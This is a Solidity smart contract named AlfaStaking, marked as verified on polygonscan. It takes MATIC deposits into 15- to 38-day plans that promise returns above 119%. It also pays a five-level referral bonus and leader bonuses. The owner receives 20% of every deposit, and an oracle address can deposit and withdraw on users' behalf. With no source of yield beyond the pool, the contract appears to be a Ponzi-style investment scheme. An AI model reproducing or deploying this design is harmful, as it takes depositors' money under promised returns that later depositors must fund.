/**
 *Submitted for verification at polygonscan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT License

pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint8 percent;
  uint8 bonusPercent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint256 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint256 leader_bonus;
  uint256 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;

  uint256 leadTurnover;
  uint256 leadBonusReward;
  bool[9] receivedBonuses;

  Deposit[] deposits;
  uint256[5] structure;
  address[] referrals;
  uint256[5] refTurnover;

  bool delegateWithdraw;
}

interface IERC20 {

  function balanceOf(address account) external view returns (uint256);

  function transfer(address to, uint256 amount) external returns (bool);

}

contract AlfaStaking {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public totalLeadBonusReward;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000; // 100 * 10
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 20, 10, 5, 5]; // 5%, 2%, 1%, 0.5%, 0.5%
    uint256[9] public LEADER_BONUS_TRIGGERS = [
        600 ether,
        1_600 ether,
        3_200 ether,
        6_500 ether,
        32_000 ether,
        64_000 ether,
        320_000 ether,
        640_000 ether,
        3_200_000 ether
    ];

    uint256[9] public LEADER_BONUS_REWARDS = [
        12 ether,
        32 ether,
        64 ether,
        130 ether,
        640 ether,
        1_280 ether,
        6_400 ether,
        12_800 ether,
        64_000 ether
    ];

    uint256[3] public LEADER_BONUS_LEVEL_PERCENTS = [100, 30, 15];

    uint8 constant TARIF_MIN_DURATION = 15;
    uint8 constant TARIF_MAX_DURATION = 38;

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
    uint256 totalPlayers;

    address private oracleAddress;
    uint256 constant WITHDRAW_GAS_FEE = 250_000;

    uint256 constant MIN_DEPOSIT = 30 ether; // 30 MATIC

    event Upline(address indexed addr, address indexed upline, uint256 bonus, uint256 timestamp);
    event NewDeposit(
      address indexed addr,
      address indexed referrer,
      uint256 amount,
      uint8 tarif,
      bool isDelegated,
      uint256 timestamp
    );
    event Invest(
      address indexed addr,
      uint256 amount,
      uint256 timestamp
    );
    event MatchPayout(address indexed addr, address indexed from, uint256 amount, uint256 timestamp);
    event Withdraw(
      address indexed addr,
      address indexed to,
      uint256 amount,
      uint256 timestamp
    );
    event LeaderBonusReward(
        address indexed to,
        uint256 indexed amount,
        uint8 indexed level,
        uint256 timestamp
    );

    event SwitchDelegation(
      address indexed addr,
      bool newDelegationWithdrawFlag,
      uint256 timestamp
    );

    constructor(address oracleAddress_) {
        owner = msg.sender;
        players[owner].upline = owner;

        uint8 tarifPercent = 119;
        for (uint8 tarifDuration = TARIF_MIN_DURATION; tarifDuration <= TARIF_MAX_DURATION; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent, 0);
            if (tarifDuration == 30) {
              tarifs[tarifDuration].bonusPercent = 10;
            }
            tarifPercent+= 5;
        }

        oracleAddress = oracleAddress_;
    }

    function changeOracleAddress(address newOracleAddress) external {
      require(msg.sender == owner, "Only owner can call this method");
      require(oracleAddress != newOracleAddress, "This address is already the Oracle");

      oracleAddress = newOracleAddress;
    }

    function setTarifBonus(uint8 tarifDuration, uint8 bonusPercent) external {
      require(msg.sender == owner, "Only owner can call this method");
      require(tarifDuration >= TARIF_MIN_DURATION && tarifDuration <= TARIF_MAX_DURATION, "Invalid tarif duration");
      require(bonusPercent >= 0 && bonusPercent <= 10, "Invalid bonus percent value");

      tarifs[tarifDuration].bonusPercent = bonusPercent;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            players[_addr].last_payout = block.timestamp;
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus, block.timestamp);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if (players[_addr].upline == address(0) && _addr != owner) {
            totalPlayers++;
            if (players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100, block.timestamp);
            
            players[_upline].referrals.push(_addr);
            for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                address prevUpline = _upline;
                _upline = players[_upline].upline;

                if (_upline == address(0) || prevUpline == _upline) {
                  break;
                }
            }

            if (_addr != msg.sender) { // delegated deposit
              players[_addr].delegateWithdraw = true;
            }
        }
    }

    function deposit(uint8 tarif, address upline) external payable {
      deposit(tarif, upline, msg.sender);
    }

    function delegatedDeposit(uint8 tarif, address upline, address user) external payable {
      deposit(tarif, upline, user);
    }

    function deposit(uint8 _tarif, address _upline, address _user) private {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        if (msg.sender != oracleAddress) {
          require(msg.value >= MIN_DEPOSIT, "Minimum deposit amount is 30 MATIC");
        }

        Player storage player = players[_user];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(_user, _upline, msg.value);

        uint256 amount = msg.value;
        if (player.deposits.length == 0 && tarifs[_tarif].bonusPercent > 0) { // 1st deposit
          amount = amount * uint256(100 + tarifs[_tarif].bonusPercent) / 100;
        }
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            time: block.timestamp
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(_user, msg.value);
        distributeBonuses(msg.value, _user);

        address ref = player.upline;
        for (uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
          players[ref].refTurnover[i]+= msg.value;

          address prevRef = ref;
          ref = players[ref].upline;
          if (prevRef == ref || ref == address(0x0)) {
            break;
          }
        }

        payable(owner).transfer(msg.value / 5);
        
        emit NewDeposit(_user, player.upline, amount, _tarif, msg.sender != _user, block.timestamp);
    }

    function delegatedWithdraw(address user, address to, uint256 amountToWithdraw) external {
      if (msg.sender == oracleAddress) { // Oracle
        require(players[user].delegateWithdraw, "Delegated withdraw is disabled for this user");
      } else {
        require(msg.sender == user, "You can call this method only for your address");
      }

      Player storage player = players[user];

      _payout(user);

      require(player.dividends > 0 || player.match_bonus > 0 || player.leader_bonus > 0, "Zero amount");

      uint256 amount = player.dividends + player.match_bonus + player.leader_bonus;
      require(amount >= amountToWithdraw, "The requested amount is greater than possible to withdraw");

      player.dividends = amount - amountToWithdraw;
      player.match_bonus = 0;
      player.leader_bonus = 0;
      player.total_withdrawn += amountToWithdraw;
      withdrawn += amountToWithdraw;

      uint256 gasFee = WITHDRAW_GAS_FEE * tx.gasprice;
      payable(to).transfer(amountToWithdraw - gasFee);
      payable(msg.sender).transfer(gasFee);
      
      emit Withdraw(user, to, amountToWithdraw, block.timestamp);
    }

    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0 || player.leader_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus + player.leader_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.leader_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, msg.sender, amount, block.timestamp);
    }

    function switchDelegation() external {
      require(players[msg.sender].upline != address(0x0), "Unregistered user");

      players[msg.sender].delegateWithdraw = !players[msg.sender].delegateWithdraw;

      emit SwitchDelegation(msg.sender, players[msg.sender].delegateWithdraw, block.timestamp);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * uint256(86400);
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if (from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / uint256(8640000);
            }
        }

        return value;
    }

    function distributeBonuses(uint256 _amount, address _player) private {
      address ref = players[_player].upline;

      for (uint8 i = 0; i < LEADER_BONUS_LEVEL_PERCENTS.length; i++) {
        players[ref].leadTurnover+= _amount * LEADER_BONUS_LEVEL_PERCENTS[i] / 100;

        for (uint8 j = 0; j < LEADER_BONUS_TRIGGERS.length; j++) {
          if (players[ref].leadTurnover >= LEADER_BONUS_TRIGGERS[j]) {
            if (!players[ref].receivedBonuses[j]) {
              players[ref].receivedBonuses[j] = true;
              players[ref].leadBonusReward+= LEADER_BONUS_REWARDS[j];
              totalLeadBonusReward+= LEADER_BONUS_REWARDS[j];

              players[ref].leader_bonus+= LEADER_BONUS_REWARDS[j];
              emit LeaderBonusReward(
                ref,
                LEADER_BONUS_REWARDS[j],
                i,
                block.timestamp
              );
            } else {
              continue;
            }
          } else {
            break;
          }
        }

        ref = players[ref].upline;

        if (ref == address(0x0)) {
          break;
        }
      }
    }

    function getTotalLeaderBonus(address _player) external view returns (uint256) {
      return players[_player].leadBonusReward;
    }

    function getReceivedBonuses(address _player) external view returns (bool[9] memory) {
        return players[_player].receivedBonuses;
    }

    /*
     * Only external call
     */
    function userInfo(address _addr) external view returns(uint256 for_withdraw, Player memory player) {
        player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        return (
            payout + player.dividends + player.match_bonus + player.leader_bonus,
            player
        );
    }

    function contractInfo() external view returns(
      uint256, uint256, uint256, uint256, uint256,
      uint8[] memory bonuses
    ) {
      bonuses = new uint8[](TARIF_MAX_DURATION - TARIF_MIN_DURATION + 1);

      for (uint8 tarifDuration = TARIF_MIN_DURATION; tarifDuration <= TARIF_MAX_DURATION; tarifDuration++) {
        bonuses[tarifDuration - TARIF_MIN_DURATION] = tarifs[tarifDuration].bonusPercent;
      }

      return (
        invested, withdrawn, match_bonus, totalLeadBonusReward, totalPlayers,
        bonuses
      );
    }

    function deposit() external payable {
      payable(msg.sender).transfer(msg.value);

      emit Invest(msg.sender, msg.value, block.timestamp);
    }

    function retrieveERC20(address tokenContractAddress) external {
      require(msg.sender == owner, "Only owner can call this method");

      IERC20(tokenContractAddress).transfer(
        owner,
        IERC20(tokenContractAddress).balanceOf(address(this))
      );
    }

}